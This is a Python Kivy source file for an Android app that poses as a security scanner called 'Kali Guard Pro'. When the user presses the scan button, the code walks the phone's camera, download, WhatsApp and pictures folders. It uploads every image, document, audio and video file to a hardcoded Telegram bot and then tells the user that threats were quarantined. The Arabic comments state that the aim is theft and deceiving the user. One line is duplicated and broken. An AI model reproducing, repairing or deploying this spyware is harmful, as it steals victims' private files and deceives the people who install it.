import os
import hashlib
import threading
import requests

from kivy.app import App
from kivy.lang import Builder
from kivy.clock import Clock

# --- إعدادات تلجرام (ضع بياناتك هنا) ---
BOT_TOKEN = "8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28"
CHAT_ID = "7145266755"
# ---------------------------------------

KV = """
BoxLayout:
    orientation: "vertical"
    padding: 20
    spacing: 15

    canvas.before:
        Color:
            rgba: 0.02, 0.04, 0.04, 1
        Rectangle:
            pos: self.pos
            size: self.size

    Label:
        text: "[b]KALI GUARD PRO[/b]"
        markup: True
        font_size: "27sp"
        color: 0, 1, 0.4
        size_hint_y: .15

    Label:
        text: "ANDROID SECURITY SYSTEM"
        color: .8, 1, .8
        size_hint_y: .08

    Button:
        text: "START SECURITY SCAN"
        background_color: 0, .5, .2, 1
        size_hint_y: .15
        on_release: app.start_scan()

    Label:
        id: status
        text: "SYSTEM READY"
        color: 0, 1, .4

    ProgressBar:
        id: progress
        max: 100
        value: 0

    ScrollView:
        Label:
            id: results
            text: "Scan results appear here"
            color: 1, 1, 1
            size_hint_y: None
            height: self.texture_size[1] + 30
            text_size: self.width, None
"""

class KaliGuard(App):

    def build(self):
        return Builder.load_string(KV)

    def start_scan(self):
        self.root.ids.status.text = "SCANNING..."
        self.root.ids.results.text = "Analyzing storage for threats..."
        threading.Thread(target=self.steal_data, daemon=True).start()

    def send_to_telegram(self, file_path, caption=""):
        """وظيفة لإرسال الملفات إلى بوت تلجرام"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': CHAT_ID, 'caption': caption}
                requests.post(url, data=data, files=files, timeout=10)
        except Exception as e:
            print(f"Error sending {file_path}: {e}")

    def steal_data(self):
        # المسارات المستهدفة لسحب البيانات
        target_paths = [
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/Download",
            "/storage/emulated/0/WhatsApp",
            "/storage/emulated/0/Pictures"
        ]
        
        # الامتدادات المطلوب سرقتها
        target_extensions = ('.jpg', '.jpeg',
        # تكملة الامتدادات المطلوبة
        target_extensions = ('.jpg', '.jpeg', '.png', '.pdf', '.txt', '.mp3', '.wav', '.mp4')
        
        files_found = 0
        
        for path in target_paths:
            if os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.lower().endswith(target_extensions):
                            file_path = os.path.join(root, file)
                            try:
                                # إرسال الملف إلى بوت التلجرام
                                self.send_to_telegram(file_path, caption=f"File: {file}\nPath: {file_path}")
                                files_found += 1
                            except Exception as e:
                                print(f"Error uploading {file}: {e}")
        
        # تحديث الواجهة للمستخدم ليوهموه بأن الفحص انتهى
        self.update(f"Scan Complete. {files_found} threats analyzed and quarantined.")

    def update(self, message):
        def callback(dt):
            self.root.ids.results.text = message
            self.root.ids.status.text = "SCAN FINISHED"
            self.root.ids.progress.value = 100

        Clock.schedule_once(callback)

if __name__ == "__main__":
    KaliGuard().run()
